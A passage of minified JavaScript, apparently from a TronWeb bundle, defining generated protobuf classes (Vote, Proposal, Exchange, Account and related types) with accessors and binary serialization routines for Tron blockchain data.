            }
            ,
            TronWebProto.AccountId.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getName_asU8()).length > 0 && t.writeBytes(1, r),
                (r = e.getAddress_asU8()).length > 0 && t.writeBytes(2, r)
            }
            ,
            TronWebProto.AccountId.prototype.getName = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.AccountId.prototype.getName_asB64 = function() {
                return n.Message.bytesAsB64(this.getName())
            }
            ,
            TronWebProto.AccountId.prototype.getName_asU8 = function() {
                return n.Message.bytesAsU8(this.getName())
            }
            ,
            TronWebProto.AccountId.prototype.setName = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.AccountId.prototype.getAddress = function() {
                return n.Message.getFieldWithDefault(this, 2, "")
            }
            ,
            TronWebProto.AccountId.prototype.getAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getAddress())
            }
            ,
            TronWebProto.AccountId.prototype.getAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getAddress())
            }
            ,
            TronWebProto.AccountId.prototype.setAddress = function(e) {
                return n.Message.setProto3BytesField(this, 2, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.Vote.prototype.toObject = function(e) {
                return TronWebProto.Vote.toObject(e, this)
            }
            ,
            TronWebProto.Vote.toObject = function(e, t) {
                var r = {
                    voteAddress: t.getVoteAddress_asB64(),
                    voteCount: n.Message.getFieldWithDefault(t, 2, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.Vote.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.Vote;
                return TronWebProto.Vote.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.Vote.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setVoteAddress(r);
                        break;
                    case 2:
                        r = t.readInt64();
                        e.setVoteCount(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.Vote.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.Vote.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.Vote.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getVoteAddress_asU8()).length > 0 && t.writeBytes(1, r),
                0 !== (r = e.getVoteCount()) && t.writeInt64(2, r)
            }
            ,
            TronWebProto.Vote.prototype.getVoteAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.Vote.prototype.getVoteAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getVoteAddress())
            }
            ,
            TronWebProto.Vote.prototype.getVoteAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getVoteAddress())
            }
            ,
            TronWebProto.Vote.prototype.setVoteAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.Vote.prototype.getVoteCount = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.Vote.prototype.setVoteCount = function(e) {
                return n.Message.setProto3IntField(this, 2, e)
            }
            ,
            TronWebProto.Proposal.repeatedFields_ = [6],
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.Proposal.prototype.toObject = function(e) {
                return TronWebProto.Proposal.toObject(e, this)
            }
            ,
            TronWebProto.Proposal.toObject = function(e, t) {
                var r, o = {
                    proposalId: n.Message.getFieldWithDefault(t, 1, 0),
                    proposerAddress: t.getProposerAddress_asB64(),
                    parametersMap: (r = t.getParametersMap()) ? r.toObject(e, void 0) : [],
                    expirationTime: n.Message.getFieldWithDefault(t, 4, 0),
                    createTime: n.Message.getFieldWithDefault(t, 5, 0),
                    approvalsList: t.getApprovalsList_asB64(),
                    state: n.Message.getFieldWithDefault(t, 7, 0)
                };
                return e && (o.$jspbMessageInstance = t),
                o
            }
            ),
            TronWebProto.Proposal.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.Proposal;
                return TronWebProto.Proposal.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.Proposal.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readInt64();
                        e.setProposalId(r);
                        break;
                    case 2:
                        r = t.readBytes();
                        e.setProposerAddress(r);
                        break;
                    case 3:
                        r = e.getParametersMap();
                        t.readMessage(r, (function(e, t) {
                            n.Map.deserializeBinary(e, t, n.BinaryReader.prototype.readInt64, n.BinaryReader.prototype.readInt64, null, 0, 0)
                        }
                        ));
                        break;
                    case 4:
                        r = t.readInt64();
                        e.setExpirationTime(r);
                        break;
                    case 5:
                        r = t.readInt64();
                        e.setCreateTime(r);
                        break;
                    case 6:
                        r = t.readBytes();
                        e.addApprovals(r);
                        break;
                    case 7:
                        r = t.readEnum();
                        e.setState(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.Proposal.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.Proposal.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.Proposal.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                0 !== (r = e.getProposalId()) && t.writeInt64(1, r),
                (r = e.getProposerAddress_asU8()).length > 0 && t.writeBytes(2, r),
                (r = e.getParametersMap(!0)) && r.getLength() > 0 && r.serializeBinary(3, t, n.BinaryWriter.prototype.writeInt64, n.BinaryWriter.prototype.writeInt64),
                0 !== (r = e.getExpirationTime()) && t.writeInt64(4, r),
                0 !== (r = e.getCreateTime()) && t.writeInt64(5, r),
                (r = e.getApprovalsList_asU8()).length > 0 && t.writeRepeatedBytes(6, r),
                0 !== (r = e.getState()) && t.writeEnum(7, r)
            }
            ,
            TronWebProto.Proposal.State = {
                PENDING: 0,
                DISAPPROVED: 1,
                APPROVED: 2,
                CANCELED: 3
            },
            TronWebProto.Proposal.prototype.getProposalId = function() {
                return n.Message.getFieldWithDefault(this, 1, 0)
            }
            ,
            TronWebProto.Proposal.prototype.setProposalId = function(e) {
                return n.Message.setProto3IntField(this, 1, e)
            }
            ,
            TronWebProto.Proposal.prototype.getProposerAddress = function() {
                return n.Message.getFieldWithDefault(this, 2, "")
            }
            ,
            TronWebProto.Proposal.prototype.getProposerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getProposerAddress())
            }
            ,
            TronWebProto.Proposal.prototype.getProposerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getProposerAddress())
            }
            ,
            TronWebProto.Proposal.prototype.setProposerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 2, e)
            }
            ,
            TronWebProto.Proposal.prototype.getParametersMap = function(e) {
                return n.Message.getMapField(this, 3, e, null)
            }
            ,
            TronWebProto.Proposal.prototype.clearParametersMap = function() {
                return this.getParametersMap().clear(),
                this
            }
            ,
            TronWebProto.Proposal.prototype.getExpirationTime = function() {
                return n.Message.getFieldWithDefault(this, 4, 0)
            }
            ,
            TronWebProto.Proposal.prototype.setExpirationTime = function(e) {
                return n.Message.setProto3IntField(this, 4, e)
            }
            ,
            TronWebProto.Proposal.prototype.getCreateTime = function() {
                return n.Message.getFieldWithDefault(this, 5, 0)
            }
            ,
            TronWebProto.Proposal.prototype.setCreateTime = function(e) {
                return n.Message.setProto3IntField(this, 5, e)
            }
            ,
            TronWebProto.Proposal.prototype.getApprovalsList = function() {
                return n.Message.getRepeatedField(this, 6)
            }
            ,
            TronWebProto.Proposal.prototype.getApprovalsList_asB64 = function() {
                return n.Message.bytesListAsB64(this.getApprovalsList())
            }
            ,
            TronWebProto.Proposal.prototype.getApprovalsList_asU8 = function() {
                return n.Message.bytesListAsU8(this.getApprovalsList())
            }
            ,
            TronWebProto.Proposal.prototype.setApprovalsList = function(e) {
                return n.Message.setField(this, 6, e || [])
            }
            ,
            TronWebProto.Proposal.prototype.addApprovals = function(e, t) {
                return n.Message.addToRepeatedField(this, 6, e, t)
            }
            ,
            TronWebProto.Proposal.prototype.clearApprovalsList = function() {
                return this.setApprovalsList([])
            }
            ,
            TronWebProto.Proposal.prototype.getState = function() {
                return n.Message.getFieldWithDefault(this, 7, 0)
            }
            ,
            TronWebProto.Proposal.prototype.setState = function(e) {
                return n.Message.setProto3EnumField(this, 7, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.Exchange.prototype.toObject = function(e) {
                return TronWebProto.Exchange.toObject(e, this)
            }
            ,
            TronWebProto.Exchange.toObject = function(e, t) {
                var r = {
                    exchangeId: n.Message.getFieldWithDefault(t, 1, 0),
                    creatorAddress: t.getCreatorAddress_asB64(),
                    createTime: n.Message.getFieldWithDefault(t, 3, 0),
                    firstTokenId: t.getFirstTokenId_asB64(),
                    firstTokenBalance: n.Message.getFieldWithDefault(t, 7, 0),
                    secondTokenId: t.getSecondTokenId_asB64(),
                    secondTokenBalance: n.Message.getFieldWithDefault(t, 9, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.Exchange.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.Exchange;
                return TronWebProto.Exchange.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.Exchange.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readInt64();
                        e.setExchangeId(r);
                        break;
                    case 2:
                        r = t.readBytes();
                        e.setCreatorAddress(r);
                        break;
                    case 3:
                        r = t.readInt64();
                        e.setCreateTime(r);
                        break;
                    case 6:
                        r = t.readBytes();
                        e.setFirstTokenId(r);
                        break;
                    case 7:
                        r = t.readInt64();
                        e.setFirstTokenBalance(r);
                        break;
                    case 8:
                        r = t.readBytes();
                        e.setSecondTokenId(r);
                        break;
                    case 9:
                        r = t.readInt64();
                        e.setSecondTokenBalance(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.Exchange.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.Exchange.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.Exchange.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                0 !== (r = e.getExchangeId()) && t.writeInt64(1, r),
                (r = e.getCreatorAddress_asU8()).length > 0 && t.writeBytes(2, r),
                0 !== (r = e.getCreateTime()) && t.writeInt64(3, r),
                (r = e.getFirstTokenId_asU8()).length > 0 && t.writeBytes(6, r),
                0 !== (r = e.getFirstTokenBalance()) && t.writeInt64(7, r),
                (r = e.getSecondTokenId_asU8()).length > 0 && t.writeBytes(8, r),
                0 !== (r = e.getSecondTokenBalance()) && t.writeInt64(9, r)
            }
            ,
            TronWebProto.Exchange.prototype.getExchangeId = function() {
                return n.Message.getFieldWithDefault(this, 1, 0)
            }
            ,
            TronWebProto.Exchange.prototype.setExchangeId = function(e) {
                return n.Message.setProto3IntField(this, 1, e)
            }
            ,
            TronWebProto.Exchange.prototype.getCreatorAddress = function() {
                return n.Message.getFieldWithDefault(this, 2, "")
            }
            ,
            TronWebProto.Exchange.prototype.getCreatorAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getCreatorAddress())
            }
            ,
            TronWebProto.Exchange.prototype.getCreatorAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getCreatorAddress())
            }
            ,
            TronWebProto.Exchange.prototype.setCreatorAddress = function(e) {
                return n.Message.setProto3BytesField(this, 2, e)
            }
            ,
            TronWebProto.Exchange.prototype.getCreateTime = function() {
                return n.Message.getFieldWithDefault(this, 3, 0)
            }
            ,
            TronWebProto.Exchange.prototype.setCreateTime = function(e) {
                return n.Message.setProto3IntField(this, 3, e)
            }
            ,
            TronWebProto.Exchange.prototype.getFirstTokenId = function() {
                return n.Message.getFieldWithDefault(this, 6, "")
            }
            ,
            TronWebProto.Exchange.prototype.getFirstTokenId_asB64 = function() {
                return n.Message.bytesAsB64(this.getFirstTokenId())
            }
            ,
            TronWebProto.Exchange.prototype.getFirstTokenId_asU8 = function() {
                return n.Message.bytesAsU8(this.getFirstTokenId())
            }
            ,
            TronWebProto.Exchange.prototype.setFirstTokenId = function(e) {
                return n.Message.setProto3BytesField(this, 6, e)
            }
            ,
            TronWebProto.Exchange.prototype.getFirstTokenBalance = function() {
                return n.Message.getFieldWithDefault(this, 7, 0)
            }
            ,
            TronWebProto.Exchange.prototype.setFirstTokenBalance = function(e) {
                return n.Message.setProto3IntField(this, 7, e)
            }
            ,
            TronWebProto.Exchange.prototype.getSecondTokenId = function() {
                return n.Message.getFieldWithDefault(this, 8, "")
            }
            ,
            TronWebProto.Exchange.prototype.getSecondTokenId_asB64 = function() {
                return n.Message.bytesAsB64(this.getSecondTokenId())
            }
            ,
            TronWebProto.Exchange.prototype.getSecondTokenId_asU8 = function() {
                return n.Message.bytesAsU8(this.getSecondTokenId())
            }
            ,
            TronWebProto.Exchange.prototype.setSecondTokenId = function(e) {
                return n.Message.setProto3BytesField(this, 8, e)
            }
            ,
            TronWebProto.Exchange.prototype.getSecondTokenBalance = function() {
                return n.Message.getFieldWithDefault(this, 9, 0)
            }
            ,
            TronWebProto.Exchange.prototype.setSecondTokenBalance = function(e) {
                return n.Message.setProto3IntField(this, 9, e)
            }
            ,
            TronWebProto.Account.repeatedFields_ = [5, 7, 16, 33],
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.Account.prototype.toObject = function(e) {
                return TronWebProto.Account.toObject(e, this)
            }
            ,
            TronWebProto.Account.toObject = function(e, t) {
                var r, o = {
                    accountName: t.getAccountName_asB64(),
                    type: n.Message.getFieldWithDefault(t, 2, 0),
                    address: t.getAddress_asB64(),
                    balance: n.Message.getFieldWithDefault(t, 4, 0),
                    votesList: n.Message.toObjectList(t.getVotesList(), TronWebProto.Vote.toObject, e),
                    assetMap: (r = t.getAssetMap()) ? r.toObject(e, void 0) : [],
                    assetv2Map: (r = t.getAssetv2Map()) ? r.toObject(e, void 0) : [],
                    frozenList: n.Message.toObjectList(t.getFrozenList(), TronWebProto.Account.Frozen.toObject, e),
                    netUsage: n.Message.getFieldWithDefault(t, 8, 0),
                    acquiredDelegatedFrozenBalanceForBandwidth: n.Message.getFieldWithDefault(t, 41, 0),
                    delegatedFrozenBalanceForBandwidth: n.Message.getFieldWithDefault(t, 42, 0),
                    oldTronPower: n.Message.getFieldWithDefault(t, 46, 0),
                    tronPower: (r = t.getTronPower()) && TronWebProto.Account.Frozen.toObject(e, r),
                    assetOptimized: n.Message.getBooleanFieldWithDefault(t, 60, !1),
                    createTime: n.Message.getFieldWithDefault(t, 9, 0),
                    latestOprationTime: n.Message.getFieldWithDefault(t, 10, 0),
                    allowance: n.Message.getFieldWithDefault(t, 11, 0),
                    latestWithdrawTime: n.Message.getFieldWithDefault(t, 12, 0),
                    code: t.getCode_asB64(),
                    isWitness: n.Message.getBooleanFieldWithDefault(t, 14, !1),
                    isCommittee: n.Message.getBooleanFieldWithDefault(t, 15, !1),
                    frozenSupplyList: n.Message.toObjectList(t.getFrozenSupplyList(), TronWebProto.Account.Frozen.toObject, e),
                    assetIssuedName: t.getAssetIssuedName_asB64(),
                    assetIssuedId: t.getAssetIssuedId_asB64(),
                    latestAssetOperationTimeMap: (r = t.getLatestAssetOperationTimeMap()) ? r.toObject(e, void 0) : [],
                    latestAssetOperationTimev2Map: (r = t.getLatestAssetOperationTimev2Map()) ? r.toObject(e, void 0) : [],
                    freeNetUsage: n.Message.getFieldWithDefault(t, 19, 0),
                    freeAssetNetUsageMap: (r = t.getFreeAssetNetUsageMap()) ? r.toObject(e, void 0) : [],
                    freeAssetNetUsagev2Map: (r = t.getFreeAssetNetUsagev2Map()) ? r.toObject(e, void 0) : [],
                    latestConsumeTime: n.Message.getFieldWithDefault(t, 21, 0),
                    latestConsumeFreeTime: n.Message.getFieldWithDefault(t, 22, 0),
                    accountId: t.getAccountId_asB64(),
                    accountResource: (r = t.getAccountResource()) && TronWebProto.Account.AccountResource.toObject(e, r),
                    codehash: t.getCodehash_asB64(),
                    ownerPermission: (r = t.getOwnerPermission()) && TronWebProto.Permission.toObject(e, r),
                    witnessPermission: (r = t.getWitnessPermission()) && TronWebProto.Permission.toObject(e, r),
                    activePermissionList: n.Message.toObjectList(t.getActivePermissionList(), TronWebProto.Permission.toObject, e)
                };
                return e && (o.$jspbMessageInstance = t),
                o
            }
            ),
            TronWebProto.Account.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.Account;
                return TronWebProto.Account.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.Account.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setAccountName(r);
                        break;
                    case 2:
                        r = t.readEnum();
                        e.setType(r);
                        break;
                    case 3:
                        r = t.readBytes();
                        e.setAddress(r);
                        break;
                    case 4:
                        r = t.readInt64();
                        e.setBalance(r);
                        break;
                    case 5:
                        r = new TronWebProto.Vote;
                        t.readMessage(r, TronWebProto.Vote.deserializeBinaryFromReader),
                        e.addVotes(r);
                        break;
                    case 6:
                        r = e.getAssetMap();
                        t.readMessage(r, (function(e, t) {
                            n.Map.deserializeBinary(e, t, n.BinaryReader.prototype.readString, n.BinaryReader.prototype.readInt64, null, "", 0)
                        }
                        ));
                        break;
                    case 56:
                        r = e.getAssetv2Map();
                        t.readMessage(r, (function(e, t) {
                            n.Map.deserializeBinary(e, t, n.BinaryReader.prototype.readString, n.BinaryReader.prototype.readInt64, null, "", 0)
                        }
                        ));
                        break;
                    case 7:
                        r = new TronWebProto.Account.Frozen;
                        t.readMessage(r, TronWebProto.Account.Frozen.deserializeBinaryFromReader),
                        e.addFrozen(r);
                        break;
                    case 8:
                        r = t.readInt64();
                        e.setNetUsage(r);
                        break;
                    case 41:
                        r = t.readInt64();
                        e.setAcquiredDelegatedFrozenBalanceForBandwidth(r);
                        break;
                    case 42:
                        r = t.readInt64();
                        e.setDelegatedFrozenBalanceForBandwidth(r);
                        break;
                    case 46:
                        r = t.readInt64();
                        e.setOldTronPower(r);
                        break;
                    case 47:
                        r = new TronWebProto.Account.Frozen;
                        t.readMessage(r, TronWebProto.Account.Frozen.deserializeBinaryFromReader),
                        e.setTronPower(r);
                        break;
                    case 60:
                        r = t.readBool();
                        e.setAssetOptimized(r);
                        break;
                    case 9:
                        r = t.readInt64();
                        e.setCreateTime(r);
                        break;
                    case 10:
                        r = t.readInt64();
                        e.setLatestOprationTime(r);
                        break;
                    case 11:
                        r = t.readInt64();
                        e.setAllowance(r);
                        break;
                    case 12:
                        r = t.readInt64();
                        e.setLatestWithdrawTime(r);
                        break;
                    case 13:
                        r = t.readBytes();
                        e.setCode(r);
                        break;
                    case 14:
                        r = t.readBool();
                        e.setIsWitness(r);
                        break;
                    case 15:
                        r = t.readBool();
                        e.setIsCommittee(r);
                        break;
                    case 16:
                        r = new TronWebProto.Account.Frozen;
                        t.readMessage(r, TronWebProto.Account.Frozen.deserializeBinaryFromReader),
                        e.addFrozenSupply(r);
                        break;
                    case 17:
                        r = t.readBytes();
                        e.setAssetIssuedName(r);
                        break;
                    case 57:
                        r = t.readBytes();
                        e.setAssetIssuedId(r);
                        break;
                    case 18:
                        r = e.getLatestAssetOperationTimeMap();
                        t.readMessage(r, (function(e, t) {
                            n.Map.deserializeBinary(e, t, n.BinaryReader.prototype.readString, n.BinaryReader.prototype.readInt64, null, "", 0)
                        }
                        ));
                        break;
                    case 58:
                        r = e.getLatestAssetOperationTimev2Map();
                        t.readMessage(r, (function(e, t) {
                            n.Map.deserializeBinary(e, t, n.BinaryReader.prototype.readString, n.BinaryReader.prototype.readInt64, null, "", 0)
                        }
                        ));
                        break;
                    case 19:
                        r = t.readInt64();
                        e.setFreeNetUsage(r);
                        break;
                    case 20:
                        r = e.getFreeAssetNetUsageMap();
                        t.readMessage(r, (function(e, t) {
                            n.Map.deserializeBinary(e, t, n.BinaryReader.prototype.readString, n.BinaryReader.prototype.readInt64, null, "", 0)
                        }
                        ));
                        break;
                    case 59:
                        r = e.getFreeAssetNetUsagev2Map();
                        t.readMessage(r, (function(e, t) {
                            n.Map.deserializeBinary(e, t, n.BinaryReader.prototype.readString, n.BinaryReader.prototype.readInt64, null, "", 0)
                        }
                        ));
                        break;
                    case 21:
                        r = t.readInt64();
                        e.setLatestConsumeTime(r);
                        break;
                    case 22:
                        r = t.readInt64();
                        e.setLatestConsumeFreeTime(r);
                        break;
                    case 23:
                        r = t.readBytes();
                        e.setAccountId(r);
                        break;
                    case 26:
                        r = new TronWebProto.Account.AccountResource;
                        t.readMessage(r, TronWebProto.Account.AccountResource.deserializeBinaryFromReader),
                        e.setAccountResource(r);
                        break;
                    case 30:
                        r = t.readBytes();
                        e.setCodehash(r);
                        break;
                    case 31:
                        r = new TronWebProto.Permission;
                        t.readMessage(r, TronWebProto.Permission.deserializeBinaryFromReader),
                        e.setOwnerPermission(r);
                        break;
                    case 32:
                        r = new TronWebProto.Permission;
                        t.readMessage(r, TronWebProto.Permission.deserializeBinaryFromReader),
                        e.setWitnessPermission(r);
                        break;
                    case 33:
                        r = new TronWebProto.Permission;
                        t.readMessage(r, TronWebProto.Permission.deserializeBinaryFromReader),
                        e.addActivePermission(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.Account.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.Account.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.Account.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getAccountName_asU8()).length > 0 && t.writeBytes(1, r),
                0 !== (r = e.getType()) && t.writeEnum(2, r),
                (r = e.getAddress_asU8()).length > 0 && t.writeBytes(3, r),
                0 !== (r = e.getBalance()) && t.writeInt64(4, r),
                (r = e.getVotesList()).length > 0 && t.writeRepeatedMessage(5, r, TronWebProto.Vote.serializeBinaryToWriter),
                (r = e.getAssetMap(!0)) && r.getLength() > 0 && r.serializeBinary(6, t, n.BinaryWriter.prototype.writeString, n.BinaryWriter.prototype.writeInt64),
                (r = e.getAssetv2Map(!0)) && r.getLength() > 0 && r.serializeBinary(56, t, n.BinaryWriter.prototype.writeString, n.BinaryWriter.prototype.writeInt64),
                (r = e.getFrozenList()).length > 0 && t.writeRepeatedMessage(7, r, TronWebProto.Account.Frozen.serializeBinaryToWriter),
                0 !== (r = e.getNetUsage()) && t.writeInt64(8, r),
                0 !== (r = e.getAcquiredDelegatedFrozenBalanceForBandwidth()) && t.writeInt64(41, r),
                0 !== (r = e.getDelegatedFrozenBalanceForBandwidth()) && t.writeInt64(42, r),
                0 !== (r = e.getOldTronPower()) && t.writeInt64(46, r),
                null != (r = e.getTronPower()) && t.writeMessage(47, r, TronWebProto.Account.Frozen.serializeBinaryToWriter),
                (r = e.getAssetOptimized()) && t.writeBool(60, r),
                0 !== (r = e.getCreateTime()) && t.writeInt64(9, r),
                0 !== (r = e.getLatestOprationTime()) && t.writeInt64(10, r),
                0 !== (r = e.getAllowance()) && t.writeInt64(11, r),
                0 !== (r = e.getLatestWithdrawTime()) && t.writeInt64(12, r),
                (r = e.getCode_asU8()).length > 0 && t.writeBytes(13, r),
                (r = e.getIsWitness()) && t.writeBool(14, r),
                (r = e.getIsCommittee()) && t.writeBool(15, r),
                (r = e.getFrozenSupplyList()).length > 0 && t.writeRepeatedMessage(16, r, TronWebProto.Account.Frozen.serializeBinaryToWriter),
                (r = e.getAssetIssuedName_asU8()).length > 0 && t.writeBytes(17, r),
                (r = e.getAssetIssuedId_asU8()).length > 0 && t.writeBytes(57, r),
                (r = e.getLatestAssetOperationTimeMap(!0)) && r.getLength() > 0 && r.serializeBinary(18, t, n.BinaryWriter.prototype.writeString, n.BinaryWriter.prototype.writeInt64),
                (r = e.getLatestAssetOperationTimev2Map(!0)) && r.getLength() > 0 && r.serializeBinary(58, t, n.BinaryWriter.prototype.writeString, n.BinaryWriter.prototype.writeInt64),
                0 !== (r = e.getFreeNetUsage()) && t.writeInt64(19, r),
                (r = e.getFreeAssetNetUsageMap(!0)) && r.getLength() > 0 && r.serializeBinary(20, t, n.BinaryWriter.prototype.writeString, n.BinaryWriter.prototype.writeInt64),
                (r = e.getFreeAssetNetUsagev2Map(!0)) && r.getLength() > 0 && r.serializeBinary(59, t, n.BinaryWriter.prototype.writeString, n.BinaryWriter.prototype.writeInt64),
                0 !== (r = e.getLatestConsumeTime()) && t.writeInt64(21, r),
                0 !== (r = e.getLatestConsumeFreeTime()) && t.writeInt64(22, r),
                (r = e.getAccountId_asU8()).length > 0 && t.writeBytes(23, r),
                null != (r = e.getAccountResource()) && t.writeMessage(26, r, TronWebProto.Account.AccountResource.serializeBinaryToWriter),
                (r = e.getCodehash_asU8()).length > 0 && t.writeBytes(30, r),
                null != (r = e.getOwnerPermission()) && t.writeMessage(31, r, TronWebProto.Permission.serializeBinaryToWriter),
                null != (r = e.getWitnessPermission()) && t.writeMessage(32, r, TronWebProto.Permission.serializeBinaryToWriter),
                (r = e.getActivePermissionList()).length > 0 && t.writeRepeatedMessage(33, r, TronWebProto.Permission.serializeBinaryToWriter)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.Account.Frozen.prototype.toObject = function(e) {
                return TronWebProto.Account.Frozen.toObject(e, this)
            }
            ,
            TronWebProto.Account.Frozen.toObject = function(e, t) {
                var r = {
                    frozenBalance: n.Message.getFieldWithDefault(t, 1, 0),
                    expireTime: n.Message.getFieldWithDefault(t, 2, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.Account.Frozen.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.Account.Frozen;
                return TronWebProto.Account.Frozen.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.Account.Frozen.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readInt64();
                        e.setFrozenBalance(r);
                        break;
                    case 2:
                        r = t.readInt64();
                        e.setExpireTime(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.Account.Frozen.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.Account.Frozen.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.Account.Frozen.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                0 !== (r = e.getFrozenBalance()) && t.writeInt64(1, r),
                0 !== (r = e.getExpireTime()) && t.writeInt64(2, r)
            }
            ,
            TronWebProto.Account.Frozen.prototype.getFrozenBalance = function() {
                return n.Message.getFieldWithDefault(this, 1, 0)
            }
            ,
            TronWebProto.Account.Frozen.prototype.setFrozenBalance = function(e) {
                return n.Message.setProto3IntField(this, 1, e)
            }
            ,
            TronWebProto.Account.Frozen.prototype.getExpireTime = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.Account.Frozen.prototype.setExpireTime = function(e) {
                return n.Message.setProto3IntField(this, 2, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.Account.AccountResource.prototype.toObject = function(e) {
                return TronWebProto.Account.AccountResource.toObject(e, this)
            }
            ,
            TronWebProto.Account.AccountResource.toObject = function(e, t) {
                var r, o = {
                    energyUsage: n.Message.getFieldWithDefault(t, 1, 0),
                    frozenBalanceForEnergy: (r = t.getFrozenBalanceForEnergy()) && TronWebProto.Account.Frozen.toObject(e, r),
                    latestConsumeTimeForEnergy: n.Message.getFieldWithDefault(t, 3, 0),
                    acquiredDelegatedFrozenBalanceForEnergy: n.Message.getFieldWithDefault(t, 4, 0),
                    delegatedFrozenBalanceForEnergy: n.Message.getFieldWithDefault(t, 5, 0),
                    storageLimit: n.Message.getFieldWithDefault(t, 6, 0),
                    storageUsage: n.Message.getFieldWithDefault(t, 7, 0),
                    latestExchangeStorageTime: n.Message.getFieldWithDefault(t, 8, 0)
                };
                return e && (o.$jspbMessageInstance = t),
                o
            }
            ),
            TronWebProto.Account.AccountResource.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.Account.AccountResource;
                return TronWebProto.Account.AccountResource.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.Account.AccountResource.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readInt64();
                        e.setEnergyUsage(r);
                        break;
                    case 2:
                        r = new TronWebProto.Account.Frozen;
                        t.readMessage(r, TronWebProto.Account.Frozen.deserializeBinaryFromReader),
                        e.setFrozenBalanceForEnergy(r);
                        break;
                    case 3:
                        r = t.readInt64();
                        e.setLatestConsumeTimeForEnergy(r);
                        break;
                    case 4:
                        r = t.readInt64();
                        e.setAcquiredDelegatedFrozenBalanceForEnergy(r);
                        break;
                    case 5:
                        r = t.readInt64();
                        e.setDelegatedFrozenBalanceForEnergy(r);
                        break;
                    case 6:
                        r = t.readInt64();
                        e.setStorageLimit(r);
                        break;
                    case 7:
                        r = t.readInt64();
                        e.setStorageUsage(r);
                        break;
                    case 8:
                        r = t.readInt64();
                        e.setLatestExchangeStorageTime(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
